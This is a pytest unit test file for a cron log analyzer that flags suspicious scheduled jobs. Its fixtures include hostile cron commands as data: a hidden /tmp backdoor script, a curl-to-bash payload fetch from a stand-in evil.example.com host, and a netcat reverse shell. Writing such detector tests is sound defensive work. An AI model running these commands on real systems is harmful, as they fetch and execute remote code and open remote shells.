"""Unit tests for core/linux_security/cron_analyzer.py."""

from __future__ import annotations

from datetime import UTC, datetime

import pytest

from core.linux_security.cron_analyzer import CronAnalyzer
from core.linux_security.models import LinuxLogEvent, LinuxSecurityFindingCategory

pytestmark = pytest.mark.unit

_NOW = datetime(2026, 7, 18, 10, 10, 0, tzinfo=UTC)


def _cron_event(message: str) -> LinuxLogEvent:
    return LinuxLogEvent(timestamp=_NOW, host="web01", process="CRON", raw_message=message)


def test_tmp_path_execution_flagged() -> None:
    candidates = CronAnalyzer().analyze([_cron_event("(root) CMD (/tmp/.hidden/backdoor.sh)")])
    assert any(c.category == LinuxSecurityFindingCategory.SUSPICIOUS_CRON for c in candidates)


def test_pipe_to_shell_flagged_critical() -> None:
    candidates = CronAnalyzer().analyze(
        [_cron_event("(root) CMD (curl http://evil.example.com/payload.sh | bash)")]
    )
    pipe_findings = [
        c for c in candidates if c.category == LinuxSecurityFindingCategory.SUSPICIOUS_CRON
    ]
    assert any(c.severity.value == "critical" for c in pipe_findings)


def test_reverse_shell_command_delegated_to_process_detector() -> None:
    candidates = CronAnalyzer().analyze([_cron_event("(root) CMD (nc -e /bin/sh 10.0.0.1 4444)")])
    assert any(c.category == LinuxSecurityFindingCategory.REVERSE_SHELL for c in candidates)


def test_benign_cron_job_not_flagged() -> None:
    candidates = CronAnalyzer().analyze([_cron_event("(root) CMD (/usr/bin/logrotate)")])
    assert candidates == []


def test_non_cron_event_ignored() -> None:
    event = LinuxLogEvent(timestamp=_NOW, process="sudo", raw_message="something")
    assert CronAnalyzer().analyze([event]) == []


def test_unparseable_cron_line_does_not_crash() -> None:
    candidates = CronAnalyzer().analyze([_cron_event("not a cron line")])
    assert candidates == []


def test_empty_events() -> None:
    assert CronAnalyzer().analyze([]) == []
